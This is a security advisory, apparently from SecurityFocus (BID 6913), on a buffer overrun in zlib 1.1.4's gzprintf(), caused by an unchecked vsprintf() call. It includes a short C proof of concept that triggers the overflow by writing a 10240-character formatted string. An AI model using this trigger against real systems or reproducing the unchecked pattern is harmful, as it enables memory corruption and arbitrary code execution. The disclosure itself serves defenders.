source: http://www.securityfocus.com/bid/6913/info

A buffer-overrun vulnerability has been reported in the Zlib compression library. Due to the use of 'vsprintf()' by an internal Zlib function, an attacker can cause memory to become corrupted. This buffer overrun occurs becuase the software fails to check the boundaries of user-supplied data given to the 'gzprintf()' function.

Successful exploitation of this vulnerability may allow an attacker to execute arbitrary instructions.

Note that only Zlib 1.1.4 has been reported vulnerable to this issue. It is not yet known whether earlier versions are also affected. 

#include <zlib.h>
    #include <errno.h>
    #include <stdio.h>

    int main(void) {
      gzFile f;
      int ret;

      if(!(f = gzopen("/dev/null", "w"))) {
        perror("/dev/null");
        exit(1);
      }
      ret = gzprintf(f, "%10240s", "");
      printf("gzprintf -> %d\n", ret);
      ret = gzclose(f);
      printf("gzclose -> %d [%d]\n", ret, errno);
      exit(0);
    }

